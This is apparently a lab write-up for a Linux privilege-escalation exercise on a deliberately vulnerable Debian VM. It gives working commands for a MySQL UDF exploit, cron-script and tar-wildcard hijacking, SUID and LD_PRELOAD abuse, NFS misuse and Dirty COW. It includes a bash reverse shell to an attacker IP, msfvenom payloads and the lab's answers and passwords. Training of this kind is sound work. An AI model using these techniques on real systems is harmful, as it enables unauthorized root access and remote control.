# Linux Privilege Excalation
# 23-05-2022
# little human
# level : medium


## Deploy the vulnerable Debian VM

> we need to connect to the machine using ssh (user:password123)
```
ssh user@10.10.11.137
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Run the 'id' command. What is the result ? | uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev) |



## Service Exploits

> mysql service exploit

> compile the tool called raptor_udf2.c

```
gcc -g -c raptor_udf2.c -fPIC
```
> run the program to generate a raptor_udf2.so file
```
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
> now connect to the mysql service as root
```
mysql -u root
```

> inside the mysql shell we have to run the following command to create a User Defined Function named "do_system" using our compiled exploit:

> replace the `raptor_udf2.so` file path if necessary

```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
> now copy the /bin/bash to /tmp/rootbash and set the SUID permission
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
> finally it's time to exploit

```
/tmp/rootbash -p
```


## Weak File Permissions - Readable /etc/shadow



| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the root user's password hash ? | $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0 |
| What hashing algorithm was used to produce te root user's password hash ? | sha512crypt |
| What is the root user's password ? | password123 |



## Weak File Permissions - Writable /etc/shadow 

> create a credential
```
mkpasswd -m sha-512 password123
```



## Weak File Permissions - Writeable /etc/passwd

> generate a credential for passwd file
```
openssl passwd password1234
```
> after the above command copy the generated hash and paste it into the `/etc/passwd` file replacing the `x` in root

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Run the 'id' command as the newroot user. What is the result ? | uid=0(root) gid=0(root) groups=0(root) |




## Sudo - Shell Escape Sequences

> list all program that allows current user to run
```
sudo -l
```
| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| How many program is "user" allowed to run via sudo ? | 11 |
| One Program on the list doesn't have a shell escape sequence on GTFOBins. Which is it ? | apache2 |



## Sudo - Environment Variables

> create a shared object using the code located at /home/user/tools/sudo/preload.c
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
> take a program name from the list of `sudo -l` (here we are taking nmap)
```
sudo LD_PRELOAD=/tmp/preload.so nmap
```

> after running the above command we shall get a root shell



## Cron Jobs - File Permissions

> first see the crontab using the following command
```
cat /etc/crontab
```
> there are two cronjob scheduled to run every minute. One is overwrite.sh and the other is compress.sh

> we will first look into the overwrite.sh and we can see that this one is writable.

> we will modify the file and put the below code into /usr/local/bin/overwrite.sh (put your kali linux vpn ip)
```
#!/bin/bash
bash -i >& /dev/tcp/10.17.48.110/4444 0>&1
```
> after that we have to start a netcat listener into our local machine.
```
nc -lvnp 4444
```
> now wait for some time and when the cronjob will run we shall get a root shell over our netcat listener.



## Cron Jobs - PATH Environment Variable

> as we have seen that there is a path variable in the crontab. we will use this to exploit.

> now we will create a bash script named `overwrite.sh` into the first location of the path variable. the file should contain the following content
```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
> now after waiting for two minutes we should find a file called `rootbash` into the `/tmp/` folder.

> now just run that executable
```
/tmp/rootbash -p
```
| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the value of PATH variable in /etc/crontab ? | /home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin |

## Cron Jobs - Wildcards

> now view the another script from /usr/local/bin/compress.sh
```
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *

```
Here the tar command is running with a wildcard(*) in home directory.

> using msfvenom we willgenerate a reverse shell ELF binary using our kali lhost ip. and transfer the file to the vm
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.17.48.110 LPORT=4444 -f elf -o shell.elf

```

> now give the executable permission to the shell.elf
```
chmod +x shell.elf
```

> create these files in /home/user
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

> now set up a netcat listener in local machine
```
nc -lvnp 4444
```

after some time we will get a root shell into this netcat listener


## SUID / SGID Executables - Known Exploits

> find the SUID / SGID executables on the Debian VM:
```
find / -type f -a \(-perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```
> to get a root shell just run the exploit
```
./home/user/tools/suid/exim/cve-2016-1531.sh
```

## SUID / SGID Executables - Shared Object Injection

> Run strace on the file and search the output for open/access calls and for "no such file" errors:
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

> Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

> now we will create the .config directory for the libcalc.so file 
```
mkdir /home/user/.config
```

> Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:

```
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

> now just execute the `/usr/local/bin/suid-so` and we will get a root shell instead of that progress bar.


## SUID / SGID Executables - Environment Variables

> The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

> first execute the file and note that it seems to be trying to start apache2 webserver. run strings on that binary to see strings of printable character

```
strings /usr/local/bin/suid-env

``` 

> One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

> Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:
```
gcc -o service /home/user/tools/suid/service.c
```
> Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
```
PATH=.:$PATH /usr/local/bin/suid-env
```


## SUID / SGID Executables - Abusing Shell Features (#1)

 > The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

> verify with strings 
```
strings /usr/local/bin/suid-env2
```

> In Bash version <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

> verify the version of Bash installed on the Debian VM is less than 4.2-048:
```
/bin/bash --version
```

> Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
> now run the `/usr/local/bin/suid-env2` to gain a root shell

## SUID / SGID Executables - Abusing Shell Features (#2)

> When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements

> Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

> now just run the `/tmp/rootbash` with a `-p` flag to gain a root shell



## Passwords & keys - History Files

> If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

> View the contents of all the hidden history files in the user's home directory:
```
cat ~/.*history | less
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the full mysql command the user executed ? | mysql -h somehost.local -uroot -ppassword123 |




## Passwords & Keys - Config Files

> Config files often contain passwords in plaintext or other reversible formats.

> List the contents of the user's home directory:
```
ls /home/user
```
> Note the presence of a myvpn.ovpn config file. View the contents of the file:

```
cat /home/user/myvpn.ovpn
```
> The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What file did you find the root user's credentials in ? | /etc/openvpn/auth.txt |




## Passwords & Keys - SSH Keys

> Sometimes users make backups of important files but fail to secure them with the correct permissions.

> look for hidden files & directories in the system root 
```
ls -la /
```
> there appears to be a hidden directory called .ssh. View the contents of the directory `ls -la /.ssh/`

> there we got the private key for connecting to the ssh

> copy the key and connect usingn the private key
```
chmod 600 root_key
ssh -i root_key root@10.10.233.251

```



## NFS (Network File System)

> Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

> check the NFS share configuration on the Debian VM :
```
cat /etc/exports
```

> note that /tmp share has root squashinng. now go to the local kali machine and start root terminal.
```
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.233.251:/tmp /tmp/nfs
```
> now we will generate a payload using msfvenom and save it to the mounted share(this payload will symply call the /bin/bash)
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

chmod +xs /tmp/nfs/shell.elf
```

> now from the VM just run the file
```
/tmp/shell.elf

```

> now we are in the root shell BooM!!

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the name of the option that disables root squashing? | no_root_squash |




## Kernel Exploits

#### Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.

> Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:
```
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```
> The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).

> Compile the code and run it (note that it may take several minutes to complete):
```
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w

./c0w

```
> Once the exploit completes, run /usr/bin/passwd to gain a root shell:

```
/usr/bin/passwd
```
> Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!
```
mv /tmp/bak /usr/bin/passwd
```





#        THE END 
